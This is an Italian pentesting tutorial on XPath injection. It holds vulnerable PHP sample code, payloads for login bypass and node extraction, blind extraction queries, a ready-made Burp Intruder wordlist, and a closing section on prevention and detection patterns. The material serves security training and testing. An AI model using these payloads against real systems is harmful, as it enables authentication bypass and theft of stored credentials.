---
title: 'XPath Injection: Payload, Login Bypass e Blind Exploitation su Documenti XML'
slug: xpath-injection
description: 'XPath Injection nel pentesting: bypass autenticazione, estrazione dati da documenti XML e tecniche di blind XPath injection nelle applicazioni enterprise.'
image: /xpath-injection.webp
draft: false
date: 2026-03-20T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xpath-injection
  - injection-attacks
---

La XPath Injection è la[ SQL Injection ](https://hackita.it/articoli/sql-injection)dei documenti XML.
Stesso principio: l'applicazione concatena l'input utente in una query senza sanitizzarlo, e l'attaccante manipola quella query per bypassare la logica o estrarre dati sensibili.

La differenza è il target: invece di un database relazionale, attacchi un **documento XML** interrogato con **XPath** (XML Path Language).

La vuln è rara — presente nel 5% circa dei pentest su applicazioni enterprise — ma l'impatto è alto: i file XML usati come backend di autenticazione contengono spesso credenziali in chiaro, hash deboli, o configurazioni interne. Un singolo file `.xml` esposto può aprire l'accesso a tutto il sistema.

La trovi in: portali legacy enterprise, sistemi SOAP, applicazioni PHP con `SimpleXML`, cataloghi prodotti, sistemi di autenticazione custom basati su file XML.

***

## Cos'è la XPath Injection e Come Funziona

XPath è un linguaggio per navigare documenti XML, analogo a SQL per i database relazionali.

Un documento XML tipico che autentica utenti si presenta così:

```xml
<works>
  <work>
    <id>1</id>
    <employee>bob</employee>
    <password>Iamrockinginmyroom1212</password>
    <service>car</service>
  </work>
  <work>
    <id>2</id>
    <employee>alice</employee>
    <password>iamarabbitholeand7875</password>
    <service>bike</service>
  </work>
</works>
```

Una query XPath per filtrare per servizio è:

```xpath
//works/work[service='car']
```

Il codice PHP vulnerabile costruisce la query concatenando l'input:

```php
// ❌ VULNERABILE — input non sanitizzato
$query = "//works/work[service='" . $_GET['work'] . "']";
$result = $xml->xpath($query);
```

Se passi `car`, la query funziona. Se passi `'`, il parser XPath va in errore — e hai trovato il punto di injection.

***

## Come Identificare una XPath Injection durante un Pentest

### Step 1 — Individua i parametri sospetti

Cerca parametri GET/POST che filtrano dati da strutture XML:

* form di login su applicazioni legacy o enterprise
* filtri di ricerca e liste risultati
* endpoint SOAP/XML-RPC
* qualsiasi parametro che restituisce dati strutturati

### Step 2 — Test base con l'apostrofo

Inserisci `'` nel campo sospetto. Una risposta come questa conferma la vuln:

```
XML Error; No ' entity found
Warning: SimpleXMLElement::xpath(): Invalid expression in /var/www/html/portal.php on line 68
```

### Step 3 — Distingui error-based da blind

* **Error-based**: l'app espone errori XPath → lavori più veloce, più dati
* **Blind**: risponde solo "trovato/non trovato" → richiede boolean exploitation

### Step 4 — Gestisci l'encoding

Alcune app processano l'input come XML prima di passarlo a XPath.
In XML, l'apostrofo `'` è riservato — va scritto come `&apos;`.

Regola pratica:

* `'` crasha ma non bypassa → prova `&apos;`
* Payload con `|` non funzionano con `&apos;` → torna al `'` nudo
* Nell'URL, `&` va encodato `%26`, quindi `&apos;` diventa `%26apos;`

Non esiste una regola fissa. Prova entrambi e osserva la risposta.

***

## Payload XPath Injection per Login Bypass

Se l'applicazione autentica tramite XPath, la query interna è tipo:

```xpath
//user[username='INPUT' and password='INPUT']
```

Questi xpath injection payload forzano la condizione a `true`, bypassando l'autenticazione:

**Con apostrofo nudo:**

```
' or '1'='1
' or ''='
' or true() or '
' or 1 or '
x' or 1=1 or 'x'='y
admin' or '
admin' or '1'='2
' or 1]%00
```

**Con encoding XML (quando richiesto dall'app):**

```
&apos; or &apos;1&apos;=&apos;1
&apos; or &apos;&apos;=&apos;
&apos; or true() or &apos;
x&apos; or 1=1 or &apos;x&apos;=&apos;y
admin&apos; or &apos;
```

***

## Esempio Pratico Completo di XPath Injection

**Scenario:** portale PHP con filtro dipendenti per servizio. Il backend legge da `works.xml`.

**Query originale del codice:**

```xpath
//works/work[service='car']
```

**Input legittimo:** `car`
**Risultato:** lista dipendenti del servizio auto.

***

**Input malevolo — bypass filtro:**

```
' or '1'='1
```

**Query risultante:**

```xpath
//works/work[service='' or '1'='1']
```

`'1'='1'` è sempre vero → l'app restituisce tutti i nodi `work` senza filtro,
indipendentemente dal servizio.

***

**Input malevolo — xpath injection per estrazione password:**

```
')]+|+//password%00
```

**Query risultante (semplificata):**

```xpath
//works/work[service='')]+|+//password
```

**Risultato:** l'operatore `|` aggiunge in output tutti i nodi `password`
dell'intero documento XML. Le password appaiono direttamente nella risposta HTML.

**Perché `//password` funziona senza conoscere la struttura?**

`//password` cerca il nodo `password` ovunque nell'albero XML, ignorando
il percorso completo. Non importa se è `/works/work/password` o
`/users/user/password` — `//` lo trova comunque.

***

## Estrazione Dati XML con XPath Injection

Quando l'app mostra output visibile, l'operatore `|` permette di aggiungere
nodi extra alla risposta — equivalente alla `UNION SELECT` in SQL.

**Payload per string extraction (con apostrofo nudo):**

```
')]+|+//password%00
')]+|+//user/*[1]+|+a[('
')]+|+//user/*[2]+|+a[('
')]+|+//user/*[3]+|+a[('
')]+|+//user/*[4]+|+a[('
')+or+1=1]+|+//user/password[('')=('
')+or+2=1]+|+//user/node()[('')=('
')]+|+//./node()[('')=('
')]+|+//node()[('')=('
')]/../*[3][text()!=('
')+or+1=1+or+('
```

**Il null byte `%00`:**
Tronca la stringa dopo il path — quello che segue viene ignorato dal parser.
`')]+|+//password%00` estrae i nodi `password` chiudendo la query senza
gestire manualmente le parentesi.

**La sintassi `a[contains(a,'`:**
Alternativa al null byte. `a` è un nodo inesistente — serve solo a
completare la sintassi XPath senza rompere la query originale.

***

## Blind XPath Injection: Estrazione Character-by-Character

Quando l'app non mostra dati ma risponde solo "trovato/non trovato",
si lavora in blind — identico alla Blind SQLi boolean-based.

**Indicatore fondamentale:**

* Vedi risultati → **TRUE**
* "No results found" / pagina vuota → **FALSE**

### Fase 1 — Mappa la struttura del documento XML

```
' and count(/*)=1 and '1'='1
' and count(/*[1]/*)=3 and '1'='1
' and name(/*[1])='works' and '1'='1
' and count(/works/work[1]/*)=4 and '1'='1
```

Cambia il numero finché ottieni TRUE. Costruisci così l'albero del documento.

### Fase 2 — Recupera i nomi dei nodi

```
' and substring(name(/*[1]/*[1]),1,1)='w' and '1'='1
' and substring(name(/*[1]/*[1]),2,1)='o' and '1'='1
```

Lettera per lettera, ricostruisci il nome del nodo.

### Fase 3 — Determina la lunghezza del valore

```
' and string-length(//work[1]/password)=22 and '1'='1
```

Prova lunghezze crescenti finché è TRUE.

### Fase 4 — Estrai il valore carattere per carattere

```
' and substring(//work[1]/password,1,1)='I' and '1'='1
' and substring(//work[1]/password,2,1)='a' and '1'='1
' and substring(//work[1]/password,3,1)='m' and '1'='1
```

In pentest reale automatizzi con uno script Python o con Burp Intruder
in modalità cluster bomb (posizione + carattere).

**Payload blind con encoding XML:**

```
&apos;+and+count(/*)=1+and+&apos;1&apos;=&apos;1
&apos;+and+count(/@*)=1+and+&apos;1&apos;=&apos;1
&apos;+and+count(/comment())=1+and+&apos;1&apos;=&apos;1
&apos;)+and+contains(../password,&apos;c
&apos;)+and+starts-with(../password,&apos;c
```

***

## Wordlist Completa per Burp Intruder

Carica questa lista in Burp Intruder → Payloads → Simple list.

```
'+or+'1'='1
'+or+''='
'+or+true()+or+'
'+or+1+or+'
x'+or+1=1+or+'x'='y
admin'+or+'
admin'+or+'1'='2
'+or+1]%00
')]+|+//password%00
')]+|+//user/*[1]+|+a[('
')]+|+//user/*[2]+|+a[('
')]+|+//user/*[3]+|+a[('
')]+|+//user/*[4]+|+a[('
')+or+1=1]+|+//user/password[('')=('
')]+|+//./node()[('')=('
')]+|+//node()[('')=('
')]/../*[3][text()!=('
')+or+1=1+or+('
'+and+count(/*)=1+and+'1'='1
'+and+count(/@*)=1+and+'1'='1
'+and+count(/comment())=1+and+'1'='1
&apos;+or+&apos;1&apos;=&apos;1
&apos;+or+&apos;&apos;=&apos;
&apos;+or+true()+or+&apos;
x&apos;+or+1=1+or+&apos;x&apos;=&apos;y
admin&apos;+or+&apos;
admin&apos;+or+&apos;1&apos;=&apos;2
&apos;+or+1]%00
&apos;)+and+contains(../password,&apos;c
&apos;)+and+starts-with(../password,&apos;c
&apos;+and+count(/*)=1+and+&apos;1&apos;=&apos;1
```

**Workflow Burp:**

1. Intercetta la richiesta e confermala nel Repeater
2. Manda all'Intruder, marca il parametro con `§`
3. Simple list → incolla la wordlist
4. Grep match sulla stringa che indica TRUE (es. un username valido)
5. Lancia e ordina per lunghezza risposta — le anomalie sono i payload che funzionano

***

## Tool per XPath Injection

| Tool                                                                      | Tipo       | Note                                                 |
| ------------------------------------------------------------------------- | ---------- | ---------------------------------------------------- |
| [xcat](https://github.com/orf/xcat)                                       | Automatico | Standard, richiede `--true-string` corretto          |
| [xxxpwn\_smart](https://github.com/aayla-secura/xxxpwn_smart)             | Automatico | Fork con predictive text, richiede file request HTTP |
| [xxxpwn](https://github.com/feakk/xxxpwn)                                 | Automatico | Versione base                                        |
| [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer) | Blind      | Specializzato solo blind                             |
| Burp Intruder                                                             | Manuale    | Sempre valido, gestisce qualsiasi encoding           |

**Quando i tool falliscono:**
App che richiedono `&apos;` invece di `'` fregano tutti i tool standard —
testano con apostrofo nudo, non rilevano la vuln. In questi casi procedi
a mano con Burp: è l'unico modo per gestire encoding non standard.

***

## XPath Injection vs SQL Injection: Differenze Chiave

|                    | SQL Injection                    | XPath Injection |
| ------------------ | -------------------------------- | --------------- |
| Target             | Database relazionale             | Documento XML   |
| Linguaggio         | SQL                              | XPath           |
| Lettura filesystem | Funzioni specifiche (LOAD\_FILE) | No              |
| RCE                | MSSQL `xp_cmdshell`, MySQL UDF   | No              |
| Union equivalent   | `UNION SELECT`                   | Operatore `\|`  |
| Blind              | Boolean, Time-based              | Boolean         |
| Commenti           | `--`, `#`                        | Non supportati  |
| Frequenza          | Alta                             | \~5% enterprise |

XPath Injection è **read-only**: nessuna scrittura, nessuna RCE diretta.
Il suo valore è nell'**information disclosure** — credenziali e configurazioni
estratte dal file XML, usabili per lateral movement o accesso a sistemi correlati.

Per approfondire le injection attacks in generale: [SQL Injection](https://hackita.it/articoli/sql-injection).
Se il target usa XML anche per altri scopi, valuta anche [XXE Injection](https://hackita.it/articoli/xxe-injection)
che può portare a lettura di file arbitrari sul server. Entrambe le tecniche
si testano con [Burp Suite](https://hackita.it/articoli/burp-suite-guida).

***

## Errori Comuni Durante i Test

**I payload non funzionano nell'URL**
`&` in `&apos;` viene interpretato come separatore di parametri.
Soluzione: encoda `&` come `%26` → `%26apos;`.

**Tutti i payload danno lo stesso risultato**
Stai usando GET quando l'app vuole POST (o viceversa).
Controlla il metodo nel sorgente HTML del form — cerca `method="POST"`.

**Il blind risponde sempre TRUE**
La stringa TRUE che hai scelto come indicatore compare sempre nella pagina.
Scegli una stringa che appare solo con dati reali — un username specifico,
non un messaggio generico.

**`../password` non trova niente**
Il path relativo è sbagliato. Usa `//password` per trovare il nodo
ovunque nell'albero senza conoscere la struttura esatta.

**I tool danno `No injections detected`**
L'app usa encoding non standard. I tool testano con `'` nudo.
Procedi a mano con Burp Intruder e la wordlist sopra.

***

## Come Prevenire una XPath Injection

### Lato sviluppo

**Query parametrizzate** (dove supportate):

```python
# ✅ SICURO
result = xml.xpath("//work[service=$service]", service=user_input)
```

**Whitelist sull'input — approccio più robusto:**

```php
// ✅ Accetta solo valori attesi
if (!in_array($input, ['car', 'bike'])) {
    http_response_code(400);
    exit("Input non valido");
}
```

**Non usare XML come backend di autenticazione.** Un database con hashing
bcrypt o Argon2 è la scelta corretta. Il file XML è un rischio strutturale
indipendentemente dalla sanitizzazione dell'input.

**Escape dei caratteri speciali XPath** se l'input dinamico è inevitabile:
sostituisci `'` con `&apos;` e `"` con `&quot;` prima dell'inserimento.

### Lato detection (Blue Team)

* Alerta su errori `SimpleXMLElement::xpath()` e `XPathException` nei log applicativi
* Monitora input con pattern: `'`, `"`, `|`, `//`, `[`, `]`, `or '1'='1`, `substring(`
* WAF rule su payload XPath comuni — molti WAF enterprise hanno signature preconfigurate
* Log completo dei parametri GET/POST per correlazione incidenti post-breach

Vedi anche [Broken Authentication](https://hackita.it/articoli/broken-authentication) per il contesto
più ampio di come la XPath Injection si inserisce nelle catene di attacco reali.

***

## FAQ

**Cos'è una XPath Injection?**
Una vulnerabilità in cui l'input utente viene inserito senza sanitizzazione
in una query XPath, permettendo di alterarne la logica per bypassare
autenticazioni o estrarre dati da documenti XML.

**Qual è la differenza tra SQL Injection e XPath Injection?**
Stesso principio, target diverso. SQLi attacca database relazionali,
XPath Injection attacca documenti XML. XPath Injection non permette
scrittura né esecuzione di codice — è pura information disclosure.

**Come si testa una XPath Injection?**
Inserisci `'` nel parametro sospetto. Errore XPath nella risposta = vulnerabile.
Poi provi bypass con `or '1'='1` e estrazione con `|`. Se non funziona con
`'` nudo, prova con `&apos;`.

**La XPath Injection permette RCE?**
No. XPath è un linguaggio di query in sola lettura. Non è possibile
eseguire comandi di sistema né scrivere file tramite XPath Injection.

**XPath Injection è ancora rilevante nei pentest moderni?**
Sì — proprio perché è meno conosciuta di SQLi, molte applicazioni legacy
e portali enterprise non la patching. La trovi su sistemi SOAP, portali B2B
datati, e qualsiasi applicazione che usa file XML come fonte dati o backend
di autenticazione. L'impatto quando è presente è quasi sempre critico.

**Perché alcuni payload richiedono `&apos;` invece di `'`?**
Alcune applicazioni processano l'input come XML prima di passarlo a XPath.
In XML, `'` è riservato e va scritto come entità `&apos;`. Non c'è una
regola fissa: prova entrambi e osserva la risposta dell'applicazione.

**Come prevenire una XPath Injection?**
Query parametrizzate, whitelist sull'input, evitare XML come backend
di autenticazione, hashing delle password con bcrypt. La sanitizzazione
con blacklist è sempre bypassabile — non è una soluzione.

***

*Vedi anche: [SQL Injection](https://hackita.it/articoli/sql-injection) —
[XXE Injection](https://hackita.it/articoli/xxe-injection) —
[Burp Suite: guida pratica](https://hackita.it/articoli/burp-suite-guida) —
[Broken Authentication](https://hackita.it/articoli/broken-authentication) —
[Web Hacking: tutte le tecniche](https://hackita.it/categorie/web-hacking)*

Vedi anche: [https://portswigger.net/kb/issues/00100600\_xpath-injection](https://portswigger.net/kb/issues/00100600_xpath-injection) e: [https://hacktricks.wiki/en/pentesting-web/xpath-injection.html](https://hacktricks.wiki/en/pentesting-web/xpath-injection.html)
